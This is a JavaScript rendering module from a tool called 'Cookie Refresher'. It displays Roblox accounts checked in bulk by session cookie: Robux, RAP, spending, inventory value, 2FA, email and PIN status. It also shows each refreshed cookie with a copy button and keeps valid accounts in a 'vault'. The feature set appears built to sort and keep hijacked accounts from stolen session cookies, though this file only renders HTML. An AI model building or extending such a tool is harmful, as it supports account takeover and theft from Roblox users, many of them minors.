/* Cookie Refresher — rendering */
const Views = (() => {
  const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
  const num = n => (n ?? 0).toLocaleString('en-US');
  const coin = n => '🪙 ' + num(n);
  const ago = t => {
    if (!t) return '—';
    const s = (Date.now() - new Date(t).getTime()) / 1000;
    if (s < 60) return 'just now';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    if (s < 2592000) return Math.floor(s / 86400) + 'd ago';
    return new Date(t).toLocaleDateString();
  };
  const yrs = t => {
    if (!t) return '—';
    const d = (Date.now() - new Date(t).getTime()) / 31557600000;
    return d < 1 ? Math.floor(d * 12) + ' months' : d.toFixed(1) + ' years';
  };
  const hrs = m => m == null ? '—' : (m >= 60 ? (m / 60).toFixed(1) + 'h' : Math.round(m) + 'm');

  const badge = (label, ok, detail) =>
    `<span class="badge ${ok ? 'ok' : 'bad'}">${ok ? '✓' : '✕'} ${esc(label)}${detail ? ` <em>${esc(detail)}</em>` : ''}</span>`;

  const itemLink = (id, type) => {
    const t = String(type || '').toLowerCase();
    if (t.includes('gamepass')) return `https://www.roblox.com/game-pass/${id}`;
    if (t.includes('bundle')) return `https://www.roblox.com/bundles/${id}`;
    return `https://www.roblox.com/catalog/${id}`;
  };

  function statCard(k, v, cls = '') {
    return `<div class="stat"><div class="k">${esc(k)}</div><div class="v ${cls}">${v}</div></div>`;
  }

  /* ============ SINGLE DASHBOARD ============ */
  async function single(r) {
    const p = r.profile || {};
    const created = p.created;
    const avatar = r.avatar;

    const sec = [];
    if (r.twofa !== undefined && r.twofa !== null) sec.push(badge(r.twofa.enabled ? '2FA Enabled' : '2FA Not Enabled', r.twofa.enabled, r.twofa.enabled ? `${r.twofa.methods} method(s)` : ''));
    if (r.email) sec.push(badge(r.email.verified ? 'Verified (Email)' : 'Email Not Verified', r.email.verified, r.email.address || ''));
    if (r.phone) sec.push(badge(r.phone.verified ? 'Verified (Phone)' : 'Phone Not Verified', r.phone.verified));
    if (r.pin !== undefined && r.pin !== null) sec.push(badge(r.pin ? 'Account PIN On' : 'Account PIN Off', r.pin));
    if (r.idVerified !== undefined && r.idVerified !== null) sec.push(badge(r.idVerified ? 'ID Verified' : 'ID Not Verified', r.idVerified));

    const bd = r.birthdate || {};
    const bdStr = bd.birthMonth ? `${bd.birthMonth}/${bd.birthDay ?? '?'}/${bd.birthYear ?? '?'}` : '—';

    let html = `
      <div class="card">
        <div class="acct">
          ${avatar ? `<img src="${esc(avatar)}" alt="">` : '<img alt="">'}
          <div>
            <h2>${esc(r.displayName || r.username)}</h2>
            <div class="sub">@${esc(r.username)} · #${esc(r.userId)}</div>
            <div class="sub">Joined ${created ? new Date(created).toLocaleDateString() : '—'} · ${yrs(created)} old</div>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="stats">
          ${statCard('Balance', coin(r.robux ?? 0), 'coin')}
          ${statCard('RAP', r.rap === undefined ? '<span class="dim">off</span>' : coin(r.rap), 'coin')}
          ${statCard('Spent / yr', r.spentYear === undefined ? '<span class="dim">off</span>' : coin(r.spentYear), 'coin')}
          ${statCard('Premium', r.premium ? 'Yes' : 'No')}
          ${statCard('Birthdate', esc(bdStr))}
          ${statCard('Last checked', esc(ago(r.at)))}
        </div>
      </div>

      ${sec.length ? `<div class="card"><h3>Security</h3><div class="badges">${sec.join('')}</div></div>` : ''}
    `;

    if (r.topSpent && r.topSpent.length) {
      const icons = await API.assetIcons(r.topSpent.map(t => t.id).filter(Boolean));
      const total = r.topSpent.reduce((s, t) => s + t.robux, 0);
      html += `<div class="card">
        <div class="headline"><b>Top 5 — Robux spent</b><span class="tot">${coin(total)}</span></div>
        ${r.topSpent.map(t => `
          <a class="item" href="${itemLink(t.id, t.type)}" target="_blank" rel="noopener">
            <img src="${esc(icons[t.id] || '')}" alt="" onerror="this.style.visibility='hidden'">
            <div class="nm"><b>${esc(t.name)}</b><small>${t.count} purchase${t.count > 1 ? 's' : ''}</small></div>
            <div class="val">${coin(t.robux)}</div>
          </a>`).join('')}
      </div>`;
    }

    if (r.experiences && r.experiences.length) {
      const uids = r.experiences.map(e => e.universeId).filter(Boolean);
      const icons = await API.gameIcons(uids);
      const row = e => `
        <a class="item" href="https://www.roblox.com/games/${e.placeId || ''}" target="_blank" rel="noopener">
          <img src="${esc(icons[e.universeId] || '')}" alt="" onerror="this.style.visibility='hidden'">
          <div class="nm"><b>${esc(e.name)}</b><small>${e.lastPlayed ? 'last played ' + esc(ago(e.lastPlayed)) : 'recent'}</small></div>
          <div class="val">${hrs(e.minutes)}</div>
        </a>`;
      html += `<div class="card">
        <div class="headline"><b>Top experiences this week</b><span class="tot">${r.experiences.length}</span></div>
        <div id="expList">${r.experiences.slice(0, 10).map(row).join('')}</div>
        ${r.experiences.length > 10 ? `<div class="row"><button class="btn small" data-more="exp">Show more (${r.experiences.length - 10})</button></div>` : ''}
        <template id="expRest">${r.experiences.slice(10).map(row).join('')}</template>
      </div>`;
    }

    if (r.inventory && r.inventory.length) {
      const limited = r.inventory.filter(i => i.recentAveragePrice > 0).slice(0, 40);
      const icons = await API.assetIcons(limited.map(i => i.assetId));
      const total = r.inventory.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
      html += `<div class="card">
        <div class="headline"><b>Tradable / premium inventory</b><span class="tot">${coin(total)}</span></div>
        <div class="grid-inv">
          ${limited.map(i => `
            <a class="inv-card" href="https://www.roblox.com/catalog/${i.assetId}" target="_blank" rel="noopener">
              <img src="${esc(icons[i.assetId] || '')}" alt="" onerror="this.style.visibility='hidden'">
              <b>${esc(i.name)}</b>
              <span class="val">${coin(i.recentAveragePrice)}</span>
            </a>`).join('')}
        </div>
      </div>`;
    }

    html += `<div class="card">
      <div class="headline"><b>Refreshed cookie</b>
        <button class="btn small" id="btnCopyCookie">Copy</button></div>
      <div class="cookiebox" id="newCookie">${esc(r.cookie)}</div>
      <p class="hint">Refreshed via <code>${esc(r.refreshEndpoint || '—')}</code> at ${new Date(r.at).toLocaleString()}</p>
    </div>`;

    return html;
  }

  /* ============ BULK ROW ============ */
  function bulkRow(row) {
    const d = row.data || {};
    if (row.status === 'error') {
      return `<div class="rowcard err">
        <div class="who"><b>${esc(row.label || 'unknown')}</b><div class="id">${esc(row.error || 'error')}</div></div>
        <span class="tag bad">✕ Error</span>
        <div class="actions"><button class="iconbtn" data-retry="${row.uid}">Retry</button></div>
      </div>`;
    }
    if (row.status === 'pending' || row.status === 'running') {
      return `<div class="rowcard">
        <div class="who"><b>${esc(row.label || 'queued')}</b><div class="id">${row.status === 'running' ? 'checking…' : 'waiting'}</div></div>
        ${row.status === 'running' ? '<span class="spin"></span>' : ''}
        <span class="tag wait">${row.status}</span>
      </div>`;
    }
    const sec = [];
    if (d.twofa) sec.push(`<span class="badge ${d.twofa.enabled ? 'ok' : 'bad'}">2FA ${d.twofa.enabled ? 'On' : 'Off'}</span>`);
    if (d.email) sec.push(`<span class="badge ${d.email.verified ? 'ok' : 'bad'}">${d.email.verified ? 'Email ✓' : 'Email ✕'}</span>`);
    if (d.premium) sec.push(`<span class="badge ok">Premium</span>`);
    return `<div class="rowcard">
      ${d.avatar ? `<img src="${esc(d.avatar)}" alt="">` : ''}
      <div class="who">
        <b>${esc(d.username || row.label)}</b>
        <div class="id">#${esc(d.userId || '')}</div>
        <div class="rs">R$ ${num(d.robux ?? 0)}</div>
        <div class="mini">${sec.join('')}</div>
      </div>
      <span class="tag ok">✓ OK</span>
      <div class="actions">
        <button class="iconbtn" data-open="${esc(d.userId || '')}">Open</button>
        <button class="iconbtn" data-copy="${esc(d.userId || '')}">Copy</button>
      </div>
    </div>`;
  }

  /* ============ VAULT ============ */
  function vault(rows, cols) {
    if (!rows.length) return `<div class="card empty">Nothing stored yet. Run a check and valid accounts land here automatically.</div>`;
    const th = ['Account'];
    if (cols.robux) th.push('Robux');
    if (cols.premium) th.push('Premium');
    if (cols.twofa) th.push('2FA');
    if (cols.email) th.push('Email');
    if (cols.rap) th.push('RAP');
    if (cols.spent) th.push('Spent/yr');
    th.push('Checked', '');
    return `<div class="card" style="overflow:auto">
      <table class="vault">
        <thead><tr>${th.map(h => `<th>${h}</th>`).join('')}</tr></thead>
        <tbody>
          ${rows.map(a => `<tr>
            <td><div class="vuser">${a.avatar ? `<img src="${esc(a.avatar)}" alt="">` : ''}
              <div><b>${esc(a.username)}</b><div class="dim small mono">#${esc(a.userId)}</div></div></div></td>
            ${cols.robux ? `<td class="mono">R$ ${num(a.robux ?? 0)}</td>` : ''}
            ${cols.premium ? `<td>${a.premium ? '<span class="tag ok">Yes</span>' : '<span class="dim">No</span>'}</td>` : ''}
            ${cols.twofa ? `<td>${a.twofa ? '<span class="tag ok">On</span>' : '<span class="tag bad">Off</span>'}</td>` : ''}
            ${cols.email ? `<td>${a.emailVerified ? '<span class="tag ok">✓</span>' : '<span class="tag bad">✕</span>'}</td>` : ''}
            ${cols.rap ? `<td class="mono">R$ ${num(a.rap ?? 0)}</td>` : ''}
            ${cols.spent ? `<td class="mono">R$ ${num(a.spentYear ?? 0)}</td>` : ''}
            <td class="dim small">${esc(ago(a.lastChecked))}</td>
            <td><div class="actions">
              <button class="iconbtn" data-open="${esc(a.userId)}">Open</button>
              <button class="iconbtn" data-copy="${esc(a.userId)}">Copy</button>
              <button class="iconbtn" data-recheck="${esc(a.userId)}">Recheck</button>
              <button class="iconbtn" data-del="${esc(a.userId)}">✕</button>
            </div></td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
  }

  function toggle(key, label, sub, on, group, locked) {
    return `<div class="tg ${locked ? 'locked' : ''}">
      <div><span>${esc(label)}</span>${sub ? `<small>${esc(sub)}</small>` : ''}</div>
      <div class="sw ${on ? 'on' : ''} ${locked ? 'locked' : ''}" data-group="${group}" data-key="${key}"><i></i></div>
    </div>`;
  }

  return { esc, num, coin, ago, yrs, hrs, badge, single, bulkRow, vault, toggle, statCard };
})();